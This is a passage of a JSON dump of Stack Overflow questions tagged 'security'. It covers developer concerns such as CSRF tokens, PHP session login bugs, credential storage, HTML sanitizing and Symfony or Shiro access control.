Windows","body":"<p>Attempting to implement a poor man's test of whether a process is still running or not (essentially an equivalent of the trivial <code>kill(pid, 0)</code>.)</p>\n\n<p>Hoped to be able to simply call <code>OpenProcess</code> with some minimal desired access then test for either <code>GetLastError() == ERROR_INVALID_PARAMETER</code> or <code>GetExitCodeProcess(...) != STILL_ACTIVE</code>.</p>\n\n<p>Nice try...  Running on Windows XP, as administrator:</p>\n\n<pre><code>HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);\nif (!hProc) {\n  DWORD dwLastError = GetLastError();\n}\n</code></pre>\n\n<p>...fails miserably with <code>dwLastError == ERROR_ACCESS_DENIED</code> when <code>pid</code> is owned by a different (not SYSTEM) user.  Moreover, if <code>pid</code> <em>was</em> originally owned by a different user but has since terminated, <code>OpenProcess</code> also fails with <code>ERROR_ACCESS_DENIED</code> (not <code>ERROR_INVALID_PARAMETER</code>.)</p>\n\n<p>Do I have to use <code>Process32First</code>/<code>Process32Next</code> or <code>EnumProcesses</code>?</p>\n\n<p>I absolutely <strong>do not want to use <code>SeDebugPrivilege</code></strong>.</p>\n\n<p>Thanks,\nV</p>\n"},{"tags":["linux","security","passwords","ssh-keys"],"answer_count":10,"favorite_count":5,"up_vote_count":15,"down_vote_count":0,"view_count":920,"score":15,"question_id":208007,"title":"how do you manage servers' root passwords","body":"<p>In our administration team everyone has root passwords for all client servers.\nBut what should we do if one of the team members is not longer working with us?\nHe still has our passwords and we have to change them all, every time someone leave us. </p>\n\n<p>Now we are using ssh keys instead of passwords, but this is not helpful if we have to use something other than ssh.</p>\n"},{"tags":["iphone","security","post","data","webserver"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":42,"score":2,"question_id":12646502,"title":"Send post data securely from iPhone","body":"<p>I have the following issue:\nI've understood how to create a secure login between an iPhone app and a WebServer (SSL,Https).\nMy question is after creating the session token, how do I make sure that if a hacker intercepts it, in the subsequent POST requests I receive data from the same user?   </p>\n\n<p>I ask this because I would have to send the session token each time a request is made right? (to be able to identify the user).  </p>\n\n<p>I want to prevent multiple things:  </p>\n\n<ul>\n<li>Session hijacking where someone would sniff the users token and send data instead of him (like a highscore or something)</li>\n<li>Data injection using data that would not be normally sent from my app like a 1.000.000.000 highscore (possible score but not easily attainable).</li>\n</ul>\n\n<p>I have been looking at:</p>\n\n<ul>\n<li>UDID</li>\n<li>User Agent (if it's not from the app name of my app it's not good, the hacker would actually have to guess I do this check or download my php files somehow right?)</li>\n<li>The app is from the AppStore. If the request comes from an app that hasn't been approved by Apple it's not ok. I'm not actually sure if you can test this or not. If this works a hacker would have to actually submit an AppStore and download it to insert faulty data into my database which I hope nobody has time for.</li>\n<li>The MAC adress. Not sure if allowed by Apple. The IP doesn't work because a valid user might change IP's.</li>\n</ul>\n\n<p>Cookies from what I've seen can be easily traced and see what data is inside them.  </p>\n\n<p>Maybe I'm not asking the right question here so it could actually be how can I make sure the data I receive is from the correct user and the correct application?  </p>\n\n<p>Thank you!</p>\n"},{"tags":["javascript","security","validation"],"answer_count":7,"favorite_count":8,"up_vote_count":33,"down_vote_count":0,"view_count":17044,"score":33,"question_id":162159,"title":"JavaScript: client-side vs. server-side validation","body":"<p>Which is better to do client side or server side validation?</p>\n\n<p>In our situation we are using </p>\n\n<ul>\n<li>jQuery and MVC.  </li>\n<li>JSON data to pass between our View and Controller.  </li>\n</ul>\n\n<p>A lot of the validation I do is validating data as users enter it.\nFor example I use the the <code>keypress</code> event to prevent letters in a text box, set a max number of characters and that a number is with in a range. </p>\n\n<p>I guess the better question would be, Are there any benefits to doing server side validation over client side?</p>\n\n<hr>\n\n<p>Awesome answers everyone. The website that we have is password protected and for a small user base(&lt;50). If they are not running JavaScript we will send ninjas. But if we were designing a site for everyone one I'd agree to do validation on both sides.</p>\n"},{"tags":["java","security"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":104,"score":1,"question_id":12833362,"title":"how to choose the design pattern in java","body":"<p>i have a project to be done which on the domain of healthcare, so what design pattern would be used or should be used because the system should be strong enough so that no hacker find a way to hack or steal the information.</p>\n\n<pre><code>the following technology is used\n1.struts 1.2.9\n2.mysql for backend\n3.spring security.\n</code></pre>\n\n<p>so please suggest me the best design for this and the sample if possible since i have never worked with design pattern.</p>\n\n<p>So please help me to achieve this</p>\n\n<p>Regards.</p>\n"},{"tags":["security","frameworks","csrf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12823390,"title":"What stops someone from reading CSRF tokens in form inputs with JS","body":"<p>Most frameworks I've looked at will insert into forms a hidden input element with the value being a CSRF token.  This is designed to prevent user Bob from logging in on my site and then going to <a href=\"http://badsite.com\" rel=\"nofollow\">http://badsite.com</a> which embeds img tags or JS that tell my site to execute requests using Bob's still logged in session.</p>\n\n<p>What I'm not getting is what stops JS on badsite.com from AJAX requesting a URL with a form on my site, regex-ing the CSRF token from the hidden input element, and then AJAX posting to my site with that valid CSRF token?</p>\n\n<p>It seems to me that you'd want to use JS to insert the CSRF token into the form at runtime, pulling the value from a cookie (which is inaccessible to badsite.com).  However, I've not heard this approach mentioned and so many frameworks do the simple hidden input with the CSRF token, I'm wondering if my solution is over-engineered and I'm missing some part of what makes the hidden input method secure.</p>\n\n<p>Can anyone provide some clarity? Thanks!</p>\n"},{"tags":["php","security","login-script"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12749353,"title":"Problems with PHP, MySQL based log-in system","body":"<p><strong>IMPORTANT</strong></p>\n\n<p>After following the advice in the answers below, the client was able to log-in without any problems but did not attempt to actually navigate the secured pages. When he attempted to do so later, he was returned to log-in as before with the \"Please log in\" error. After much head scratching, something incredibly simple came to mind - the client was accessing the site with <a href=\"http://www.example.com/admin\" rel=\"nofollow\">http://www.example.com/admin</a> and everything in the login script was redirecting to <a href=\"http://example.com\" rel=\"nofollow\">http://example.com</a>, so the session cookie that it was looking for was set for another domain. This also explains why he had problems logging in the first time but not subsequent times - the script redirected him to the log-in form without the www.</p>\n\n<p>A quick fix was to write a .htaccess file to remove the www, problem solved. Of course this could also be handled within the login script, which I will improve for future use.</p>\n\n<p><strong>ORIGINAL POST</strong></p>\n\n<p>I develop PHP and MySQL based sites with a home brew CMS and log-in system. My CMS is unique to every client and it has been quite the crowd pleaser - unfortunately the same is not true of my log-in system. The following is a long post but I need to cover the details to try and find a solution. Bear with me..</p>\n\n<p>The system is fairly straight forward, if not a bit hefty. Each user has a salted hash stored in a MySQL table, alongside the SALT. When the user logs in, their SALT is retrieved and the submitted password becomes a salted hash.</p>\n\n<p>If the submitted salted hash matches the one stored in the table, the user is authenticated. Details such as their name, last IP address, and account level (3 levels on most sites) are stored in an array assigned to a session variable. They are then redirected to the landing page of the restricted site to which they logged in (Members Only or Admin/CMS).</p>\n\n<p>Secured pages include a smaller auth.php file that checks to see if the session variable containing their details is present. If not, they are redirected to that site's log-in form with an error message that reads \"Please log-in.\" If it is present, they are allowed to continue and the details stored in the array are assigned to variables.</p>\n\n<p>The problem that many users has reported is that they often need to log-in several times to keep from being bounced back to the log-in form with the \"Please log-in\" error message, or they navigate to another page in the secure site and randomly get bounced back to login with the same error. So, the session variable seems to either not be getting set or it is being cleared for some reason during normal use of the site. </p>\n\n<p>The first problem has NEVER happened to me - over a multitude of devices and networks - and I have witnessed it at a client's office using their laptop. I had them connect to my mobile hotspot and there was no change. However, they were able to log in without any problems using my laptop and my hotspot connection. Unfortunately, I was not able to connect to their network using my laptop, so that variable could not be ruled out.</p>\n\n<p>*<strong><em>NOTE - *</em></strong> I forgot to mention initially that the system works normally for problem clients after they have logged in two or three times with the correct credentials. Subsequent log-in attempts while their browser remains open tend to execute without problems thereafter. Also, the log-in page destroys the session.</p>\n\n<p>Here is the code for each stage, starting with the log-in script:</p>\n\n<p><strong>login.php</strong></p>\n\n<pre><code>&lt;?php\nputenv(\"TZ=US/Eastern\");\n\nif (array_key_exists('site', $_POST)) {\n    $authenticate = new loginUser($_POST['username'], $_POST['password'], $_POST['site'], $_SERVER['REMOTE_ADDR']);\n}\n//Authenticate and log-in\nclass loginUser {\n    private $memDB, $username, $password, $site, $ip_address;\n\n     //Clean input variables\n    private function clean($str) {\n        $str = @trim($str);\n        if(get_magic_quotes_gpc()) {\n            $str = stripslashes($str);\n        }\n        return $str;\n    }\n    //Construct variables\n    function __construct($username, $password, $site, $ip_address) {\n    session_start();\n        $this-&gt;memDB = new PDO('mysql:host=localhost;dbname=exampleDB', 'exampleUser', 'examplePassword');\n        $this-&gt;username = $this-&gt;clean($username);\n        $this-&gt;password = $this-&gt;clean($password);\n        $this-&gt;site = $site;\n        $this-&gt;ip_address = $ip_address;\n    $this-&gt;authUser();\n    }\n    //Validate username\n    private function validateUsername($username) {\n\n        $checkUsername = $this-&gt;memDB-&gt;prepare(\"SELECT COUNT(*) FROM accounts WHERE username = ?\");\n        $checkUsername-&gt;execute(array($username));\n        return $checkUsername-&gt;fetchColumn();\n    }\n    //Obtain and set account details\n    private function accountDetails() {\n\n        $fetchAccountDetails = $this-&gt;memDB-&gt;prepare(\"SELECT id, name_f, name_l, ipAddr, lastLogin, accountLevel, isActive \n        FROM accounts WHERE username = ?\");\n        $fetchAccountDetails-&gt;execute(array($this-&gt;username));\n        $accountDetails = $fetchAccountDetails-&gt;fetch();\n        $this-&gt;updateLogin();\n        return $accountDetails;\n    }\n    //Update last login details\n    private function updateLogin() {\n\n        $updateLogin = $this-&gt;memDB-&gt;prepare(\"UPDATE accounts SET ipAddr = ?, lastLogin = DATE_ADD(NOW(), INTERVAL 1 HOUR) WHERE username = ?\");\n        $updateLogin-&gt;execute(array($this-&gt;ip_address, $this-&gt;username));\n    }\n    public function authUser() {\n\n        $loginErr = array(); //Array for holding login error message\n        $loginErrFlag = false; //Boolean for error\n        //Validate submitted $_POST elements\n        if (!$this-&gt;username) {\n            $loginErr[] = \"Username missing\";\n            $loginErrFlag = true;\n        }\n        if (!$this-&gt;password) {\n            $loginErr[] = \"Password missing\";\n            $loginErrFlag = true;\n        }\n        if ($this-&gt;username &amp;&amp; $this-&gt;validateUsername($this-&gt;username) == 0) {\n            $loginErr[] = \"Username invalid\";\n            $loginErrFlag = true;\n        }\n        if (!$loginErrFlag) {\n            //Fetch the password and SALT to compare to entered password\n            $validatePW = $this-&gt;memDB-&gt;prepare(\"SELECT password, salt FROM accounts WHERE username = ? LIMIT 1\");\n            $validatePW-&gt;execute(array($this-&gt;username));\n            $passwordResult = $validatePW-&gt;fetch();\n            $dbPW = $passwordResult['password'];\n            $dbSalt = $passwordResult['salt'];\n            //Compare entered password to SALT + hash\n            $hashPW = hash('sha512', $dbSalt . $this-&gt;password);\n            if ($hashPW === $dbPW) {\n                //Logged in\n                $_SESSION['CVFD-USER-DETAILS'] = $this-&gt;accountDetails();\n                //Redirect to secure landing page for log-in origin (Members or Admin)\n                //Adding SID is a recent attempt to handle log-in problems\n                header(\"Location: http://example.com/$this-&gt;site/$this-&gt;site-main.php?\" . SID);\n                //session_write_close() was here but was removed\n                exit();\n            } else {\n                //Password invalid\n                $loginErr[] = \"Please check your password and try again\";\n                $_SESSION['CVFD_LOGIN_ERR'] = $loginErr;\n                //Redirect to the log-in for the origin\n                header(\"Location: http://example.com/$this-&gt;site\");\n        session_write_close();\n                exit();\n            }\n        } else {\n            $_SESSION['CVFD_LOGIN_ERR'] = $loginErr;\n            header(\"Location: http://example.com/$this-&gt;site\");\n            session_write_close();\n            exit();\n        }\n\n    }\n}\n?&gt;\n</code></pre>\n\n<p><strong>auth.php</strong></p>\n\n<pre><code>&lt;?php\nsession_start();\nif (!isset($_SESSION['CVFD-USER-DETAILS']) || $_SESSION['CVFD-USER-DETAILS'] == '') {\n    //Not logged in\n    $_SESSION['CVFD_LOGIN_ERR'] = array('Please login');\n    header('Location: http://example.com/members');\n    session_write_close();\n    exit();\n} else {\n    $userDetails = $_SESSION['CVFD-USER-DETAILS']; //Assign user details array to variable\n    //Check to see if account is active\n    $accountStatus = $userDetails['isActive'];\n    $accountLevel = $userDetails['accountLevel'];\n    if ($accountStatus == 0) {\n        //Account is not yet active (pending Admin activation)\n        $_SESSION['CVFD_LOGIN_ERR'] = array('Your account is suspended or pending activation');\n        header('Location: http://example.com/members');\n        session_write_close();\n        exit();\n    } else {\n        $CVFDFirstName = $userDetails['name_f'];\n        $CVFDLastName = $userDetails['name_l'];\n        $CVFDLastLogin = date(\"m/d/Y H:i:s\", strtotime($userDetails['lastLogin']));\n        $CVFDAccountLevel = $userDetails['accountLevel'];\n        $CVFDIPAddr = $userDetails['ipAddr'];\n    }\n}\n?&gt;\n</code></pre>\n\n<p>Here is how the auth.php is included in secure files-</p>\n\n<pre><code>&lt;?php\nif (substr_count($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip')) ob_start(\"ob_gzhandler\"); else ob_start();\nrequire($_SERVER['DOCUMENT_ROOT'] . '/members/includes/handlers/handler.auth.php');\n</code></pre>\n\n<p>Any help would be appreciated. Quite a mystery..</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","database","security","webserver","credentials"],"answer_count":2,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":68,"score":8,"question_id":12841087,"title":"Securing database connection information","body":"<p>I know that the question <code>How do I secure my database connection credentials?</code> has been asked and answered multiple times (e.g. <a href=\"http://stackoverflow.com/q/97984/259457\">How to secure database passwords in PHP?</a>).</p>\n\n<p>A commonly accepted answer to that question is to store the details outside of the web root. But I'm curious as to why this really makes much difference.</p>\n\n<p>From what I understand, a person cannot download the source of the PHP file via HTTP (unless your web sever is not configured properly, but you would know about that right away). So you won't be able to see the credentials unless you have access to the source of the PHP file anyways. Correct me if I'm wrong, but doesn't this basically mean that you would need shell access? And if you have shell access, can't you just get to the file outside the web root anyways?</p>\n\n<p>If the answer to that question is that the include file might have special permissions that don't allow anyone but the web server user to read it, then (considering that I have shell access), couldn't I just write (or modify) any PHP file to just echo out those credentials?</p>\n\n<p>So the question is, does it <em>really</em> make any difference whether you store the credentials directly in the PHP script vs. in a file outside the web root?</p>\n"},{"tags":["php","security","apache2","sql-injection","vbulletin"],"answer_count":1,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":75,"score":4,"question_id":12839626,"title":"HTTP-SOVIET and HTTP-PACK?","body":"<p>I found a couple vBulletin sites I administer getting hacked recently. They use the latest version of the 3.8 series (3.8.7 Patch Level 2). I am usually pretty good at finding the holes where they get in and patching them up, but this one is stumping me.  They are injecting data into the MySQL tables. The attack always happens when they make a GET request to the <code>faq.php</code> script. I was able to save data when the attack occurs.  This was the <code>$_REQUEST</code>, <code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>, and <code>$_SERVER</code> arrays.  The only thing I saw that looked out of place is that there were two new <code>$_SERVER</code> keys, <code>HTTP_SOVIET</code> and <code>HTTP_PACK</code>:</p>\n\n<p><a href=\"http://pastebin.com/b6WdZtfK\" rel=\"nofollow\">http://pastebin.com/b6WdZtfK</a></p>\n\n<p>I have to assume this is the root of the issue, but I cannot for the life of me figure out how the attacker can set this variable.  There is nothing in the request string, nothing in the cookie array, it is a GET request, not POST.</p>\n\n<p>Any idea?</p>\n"},{"tags":["security","coldfusion","sql-injection"],"answer_count":10,"favorite_count":3,"up_vote_count":10,"down_vote_count":0,"view_count":565,"score":10,"question_id":2472211,"title":"ColdFusion Security","body":"<p>What are the best practices for securing a coldfusion webpage from malicious users? (including, but not limited to, sql injection attacks)</p>\n\n<p>Is cfqueryparam enough?</p>\n"},{"tags":["c#","security","sql-server-2008","encryption","communication"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":374,"score":2,"question_id":2915036,"title":"How to secure the communication between a SQL Server database and a c# administrative tool?","body":"<p>How can I secure the communication between a C# program running locally on my computer and a SQL Server in a hosted environment?</p>\n\n<p>I have an asp.net application that is secured by SSL encryption. So using the asp.net from an open wlan connection is no problem.</p>\n\n<p>How can I achieve the same kind of encryption for my administrative tool? Would it be best to write a service? But how would that connection to the service be secured?</p>\n"},{"tags":["security","spring","authentication","spring-security","remember-me"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":5229,"score":4,"question_id":2608372,"title":"Spring Security RememberMe Services with Session Cookie","body":"<p>I am using Spring Security's RememberMe Services to keep a user authenticated. </p>\n\n<p>I would like to find a simple way to have the RememberMe cookie set as a session cookie rather than with a fixed expiration time. For my application, the cookie should persist until the user closes the browser.</p>\n\n<p>Any suggestions on how to best implement this? Any concerns on this being a potential security problem?</p>\n\n<p>The primary reason for doing so is that with a cookie-based token, any of the servers behind our load balancer can service a protected request without relying on the user's Authentication to be stored in an HttpSession. In fact, I have explicitly told Spring Security to never create sessions using the namespace. Further, we are using Amazon's Elastic Load Balancing, and so sticky sessions are not supported.</p>\n\n<p><em>NB: Although I am aware that as of Apr. 08, Amazon now supports sticky sessions, I still do not want to use them for a handful of other reasons. Namely that the untimely demise of one server would still cause the loss of sessions for all users associated with it.\n<a href=\"http://aws.amazon.com/about-aws/whats-new/2010/04/08/support-for-session-stickiness-in-elastic-load-balancing/\" rel=\"nofollow\">http://aws.amazon.com/about-aws/whats-new/2010/04/08/support-for-session-stickiness-in-elastic-load-balancing/</a></em></p>\n"},{"tags":["ios","security","audio","iphone-sdk-5.0"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1031,"score":1,"question_id":8207520,"title":"Unknown Audio Driver Error","body":"<p>I'm getting strange error message in Console, but application functions properly. Has anyone else seen this error. What does it mean?</p>\n\n<blockquote>\n  <p>2011-11-21 09:52:39.306 MyApplicationName[9871:1f07] Error loading\n  /System/Library/Extensions/AudioIPCDriver.kext/Contents/Resources/AudioIPCPlugIn.bundle/Contents/MacOS/AudioIPCPlugIn:\n  dlopen(/System/Library/Extensions/AudioIPCDriver.kext/Contents/Resources/AudioIPCPlugIn.bundle/Contents/MacOS/AudioIPCPlugIn,\n  262): Symbol not found: _CFXMLNodeGetInfoPtr   Referenced from:\n  /System/Library/Frameworks/Security.framework/Versions/A/Security<br>\n  Expected in:\n  /Developer42/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator5.0.sdk/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\n  in /System/Library/Frameworks/Security.framework/Versions/A/Security</p>\n</blockquote>\n\n<p>(Repeat 8)</p>\n"},{"tags":["java","security","kerberos","ntlm","ntlmv2"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":44,"score":2,"question_id":12837765,"title":"Authentication and SSO Application","body":"<p>My team is developing a Common Authentication-SSO (CASSO) application  to be used within a corporates LAN. Any Web application under the company's domain needs to authenticate the user through this CASSO before the User can access the application. Currently the older version has implemented BASIC/DIGEST and NTLM. However to improve the security concerns we are considering to have KERBEROS within the CASSO. </p>\n\n<p>What Authentication and Security models/protocols  shall be followed? \nSecondly shall Kerberos be implemented along with NTLM, BASIC and DIGEST or is it fine to have only Kerberos and NTLM?</p>\n"},{"tags":["html5","security","canvas","cross-domain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12769566,"title":"HTML5 Canvas cross-domain security issue","body":"<p>What specifically are the security issues that arise by allowing cross-domain image data to be manipulated?</p>\n\n<p>I know that if you own both domains, you can allow it. I'm wondering why it would be ill-advised to load in Facebook / Instagram images into a canvas to manipulate.</p>\n"},{"tags":["php","html","security","filtering"],"answer_count":7,"favorite_count":4,"up_vote_count":10,"down_vote_count":0,"view_count":392,"score":10,"question_id":2319956,"title":"Are there any good PHP based HTML filters available?","body":"<p>I am currently in a project with a PHP frontend. We're pretty concerned about security, because we'll have quite a lot of users and are an attractive target for hackers. Our users are able to submit HTML formatted content that is visible to other users later. This is a big problem because we're vulnerable for the whole set of XSS attacks. We're filtering as good as we can, but the variety of attack vectors is pretty big.</p>\n\n<p>So, I'm searching for PHP based HTML sanitizing/filtering solutions. Commercial solutions are fine (even preferred). Currently we're using a modified HTML purifier, but we're not satisfied with the results. </p>\n\n<p>What are some good libraries/tools that are capable of filtering malicious parts of HTML?</p>\n\n<p>It is nice to have for example HTML5 awareness, which will become a security nightmare once it's available \"in the wild\".</p>\n\n<p><strong>Update:</strong>\nWe're doing an in-depth configuration of <a href=\"http://htmlpurifier.org/\" rel=\"nofollow\">HTML Purifier</a>. It looks like the older framework we used before was just not configuring it at all. Now the results look much better.</p>\n"},{"tags":["security","automation","rsa"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":70,"score":2,"question_id":12072628,"title":"Is it possible to access RSA Secure Id programmatically for use in Test Automation?","body":"<p>I have a requirement where I need to enter secure Id from RSA token during login authentication and then start running automation test. </p>\n\n<p>Is it possible to access the RSA token value programmatically through any api or any other way , so that test flow can be automated completely?</p>\n"},{"tags":["security","symfony2","login","fosuserbundle"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":248,"score":3,"question_id":12672169,"title":"How to restfully login, Symfony2 Security, FOSUserBundle, FOSRestBundle?","body":"<p>I'd like to be able to login via a ws.</p>\n\n<p>I've tried to simulate this with curl pointing to <code>/login</code> but it only handles HTML, etc.\nBy the way, it requires a CSRF which I don't want.</p>\n\n<p>So I'd like to either disable the CRSF (from the <code>login_check</code>) or find a way to do it myself.</p>\n\n<p>Can I override the LoginListener (where is it?) which is used when the route <code>login_check</code> is catched.</p>\n\n<p>ANy clues?</p>\n"},{"tags":["php","security","symfony2","acl","privileges"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":96,"score":1,"question_id":12815766,"title":"Symfony 2 ACL User priviliges","body":"<p><strong>Short description:</strong></p>\n\n<p>If I add user as owner of a entity the ACL says he has no rights.</p>\n\n<p><strong>Long descroption:</strong></p>\n\n<p>If I create a blogComment I add the user as MASK_CREATOR</p>\n\n<pre><code>public function createModel( $blogComment )\n{\n    parent::createModel( $blogComment );\n\n    // Creating the ACL\n    $aclProvider = $this-&gt;get('security.acl.provider');\n    $objectIdentity = ObjectIdentity::fromDomainObject($blogComment);\n    $acl = $aclProvider-&gt;createAcl($objectIdentity);\n\n    // retrieving the security identity of the currently logged-in user\n    $securityContext  = $this-&gt;get('security.context');\n    $user             = $securityContext-&gt;getToken()-&gt;getUser();\n    $securityIdentity = UserSecurityIdentity::fromAccount($user);\n    $acl-&gt;insertObjectAce($securityIdentity, MaskBuilder::MASK_OWNER);\n\n    // grant access\n    $aclProvider-&gt;updateAcl($acl);\n}\n</code></pre>\n\n<p>Data from the database:</p>\n\n<ul>\n<li>Class: MV\\NameBundle\\Entity\\BlogComment</li>\n<li>Identity MV\\NameBundle\\Entity\\User-Pietje</li>\n<li>ObjectId: 11</li>\n<li>FieldName:</li>\n<li>Ace Order: 0</li>\n<li>Mask: 128</li>\n<li>Granting: 1</li>\n<li>Granging Strategy: all</li>\n</ul>\n\n<p>now if I check if the user can edit it (should be with mask 128 (MASK_OWNER)).</p>\n\n<pre><code>if (false === $securityContext-&gt;isGranted('EDIT', $entity)){\n     var_dump('can not edit blogComment ' . $entity-&gt;getId() );\n} else {\n     var_dump('can edit blogComment ' . $entity-&gt;getId() );\n}\n</code></pre>\n\n<p>He's saying he can not, so I guess there is something wrong.</p>\n\n<p>Now I was debugging and dont know what to do next:</p>\n\n<ul>\n<li>Class:     Symfony/Component/Security/Acl/Domain/PermissionGrantingStrategy.php</li>\n<li>function :hasSufficientPermissions</li>\n</ul>\n\n<p>I was looking to the:</p>\n\n<pre><code>143: if ($sid-&gt;equals($ace-&gt;getSecurityIdentity()) &amp;&amp; $this-&gt;isAceApplicable($requiredMask, $ace)) {\n</code></pre>\n\n<p>This is where he should end in the if, but he won't because the $sid->equeals only the the role identitys and not the user one.\ndump of the equals:</p>\n\n<pre><code>object(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[316]\n  private 'role' =&gt; string 'IS_AUTHENTICATED_ANONYMOUSLY' (length=28)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[316]\n  private 'role' =&gt; string 'IS_AUTHENTICATED_ANONYMOUSLY' (length=28)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[316]\n  private 'role' =&gt; string 'IS_AUTHENTICATED_ANONYMOUSLY' (length=28)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[316]\n  private 'role' =&gt; string 'IS_AUTHENTICATED_ANONYMOUSLY' (length=28)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[364]\n  private 'role' =&gt; string 'ROLE_ADMIN' (length=10)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[364]\n  private 'role' =&gt; string 'ROLE_ADMIN' (length=10)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[364]\n  private 'role' =&gt; string 'ROLE_ADMIN' (length=10)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[364]\n  private 'role' =&gt; string 'ROLE_ADMIN' (length=10)\n</code></pre>\n\n<p>I don't see any users in this list, What wrong should he not check the users also?\nLet me know if you can help me out.</p>\n\n<p>Regards Mitchel</p>\n"},{"tags":["iphone","objective-c","security","openssl","rsa"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":30,"score":-1,"question_id":12833223,"title":"Can Anyone help out with Including openssl into my project","body":"<p>I am trying to include the</p>\n\n<p><a href=\"http://www.openssl.org/source/\" rel=\"nofollow\">4457113 May 10 17:20:24 2012 openssl-1.0.1c.tar.gz </a> but I am constantly getting this <strong>Error</strong></p>\n\n<p><strong>unable to expand Openssl 1.0.1c.tar.gz into RegisterationMsg\n   Error1 =operation not permitted</strong></p>\n"},{"tags":["c#","security","permissions","iprincipal"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":945,"score":3,"question_id":4128186,"title":"Code is ignoring PrincipalPermission attribute?","body":"<p>I have a Delete method on all my business objects that has the PrincipalPermission attribute on it.</p>\n\n<p>Example:</p>\n\n<pre><code>[PrincipalPermission(SecurityAction.Demand, Role = \"Vendor Manager\")]\n        public static bool Delete(Vendor myVendor)\n        {\n\n            //do work here\n        }\n</code></pre>\n\n<p>The problem is that it appears to be completely ignoring my PrincipalPermission.  It lets anyone through, no matter what role they may be part of.</p>\n\n<p>Is there something else I've forgotten to do? I have added the following to my Application's global.asax in the Application Startup section:</p>\n\n<pre><code>AppDomain.CurrentDomain.SetPrincipalPolicy(System.Security.Principal.PrincipalPolicy.WindowsPrincipal);\n</code></pre>\n\n<p>But that doesn't make any difference either.</p>\n\n<p>I also just tried the following:</p>\n\n<pre><code>public static bool Delete(Vendor myVendor)\n        {\n            PrincipalPermission iPerm = new PrincipalPermission(null, \"Vendor Manager\");\n            iPerm.Demand();\n\n            //do work here\n        }\n</code></pre>\n\n<p>and wouldn't ya know, this works just fine!....  any ideas on why it works one way but not the other?</p>\n"},{"tags":["android","security","locking"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":66,"score":4,"question_id":12830605,"title":"Prevent device lock in android while my activity is running AND device is connected to charger","body":"<p>I've got a night clock app and I want to disable the keyguard for the device while the app is running AND the device is on a charger. The idea is that if you are on a charger and this app is running then it's reasonable to assume that you are in a safe location. When the app is exited (either via back or home) then I do NOT want the unlock screen to appear, just allow normal usage as if the phone was never idle for more than the device's lock time. </p>\n\n<p>Currently my app uses the FLAG_SHOW_WHEN_LOCKED window option and it nicely keeps the screen on and unlocked, but when I hit back or home (after the lock time has expired) I get the unlock keypad screen to unlock the device. I want to prevent this locking of other apps from happening while my app is running and the device is on the charger. I will obviously make this functionality a setting that the user chooses, but how to implement this?</p>\n\n<p>Can anyone help me with this - all my googleing efforts point to keeping only my app from locking, but I've already got that solved.</p>\n\n<p>Thanks.</p>\n"},{"tags":["security","jsf-2","java-ee-6","shiro"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12775343,"title":"Can a JSF Page level permission be set using Shiro","body":"<p>I'm just wondering if we have a page level permission settings in Shiro? For example I have a jsf page that I only want to show in user with role staff and permission delete.</p>\n\n<p>In JBoss we have something like:</p>\n\n<pre><code>&lt;page xmlns=\"http://jboss.com/products/seam/pages\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://jboss.com/products/seam/pages http://jboss.com/products/seam/pages-2.1.xsd\"&gt;\n    &lt;restrict&gt;#{persistentPermissionResolver.hasPermission('staff','delete')}&lt;/restrict&gt;\n&lt;/page&gt;\n</code></pre>\n\n<p>Is this functionality also available in JavaEE6 + Shiro + JSF? It seems the JSP and JSF plugin only supports enabling a certain portion of a webpage being accessible to a certain role with a certain permission.</p>\n\n<p>Thanks,\n<br />czetsuya</p>\n"},{"tags":["security","jsf-2","java-ee-6","shiro"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12810999,"title":"Shiro annotation not working on JavaEE6 project","body":"<p>Question: Where is the implementation for JavaEE6?</p>\n\n<p>I'm currently working on a JavaEE6 project and I found out that Shiro's annotation is not working out of the box even though I already configured web.xml and shiro.ini base on the documentation.</p>\n\n<p>This is what I have:</p>\n\n<p>1.) A page:</p>\n\n<pre><code>&lt;h:form&gt;\n  &lt;h:commandLink action=\"#{userBean.action1()}\" value=\"Action 